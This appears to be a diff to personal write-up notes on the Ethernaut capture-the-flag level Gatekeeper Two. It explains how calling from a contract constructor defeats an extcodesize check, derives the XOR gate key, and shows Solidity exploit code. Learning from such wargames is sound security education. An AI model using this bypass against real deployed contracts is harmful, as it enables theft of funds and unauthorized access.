@@ -9,16 +9,24 @@
 
 ### Ethernaut #4
 
-Gatekeeper Two - Spent too long on this. I keep getting `Gas estimation errored with the following message (see below). The transaction execution will likely fail. Do you want to force sending?
-execution reverted`. 
+Gatekeeper Two - In `gateTwo()`,
+
+```
+assembly { x := extcodesize(caller()) }
+    require(x == 0);
+```
+
+the assembly code is looking for the ["size of the code at address `caller()`"](https://docs.soliditylang.org/en/v0.4.23/assembly.html). `caller()` is the contract address of GateKeeperTwoSolution.sol. When contract is being created, code size (`extcodesize`) is 0.
+
+In `gateThree()`, using the formula (A ^ B = C) == (A ^ C = B), it is simple to figure out the key.
 
 My code:
 
 ```
 constructor() {
-        GatekeeperTwo gate = GatekeeperTwo(0xf59112032D54862E199626F55cFad4F8a3b0Fce9);
+        GatekeeperTwo gate = GatekeeperTwo(0x932cCdEE6d559B40F309F763f6a1d837C596402D);
         bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
-        require(gate.enter{ gas: gasleft() }(gateKey));
+        gate.enter(gateKey);
 }
 ```
 
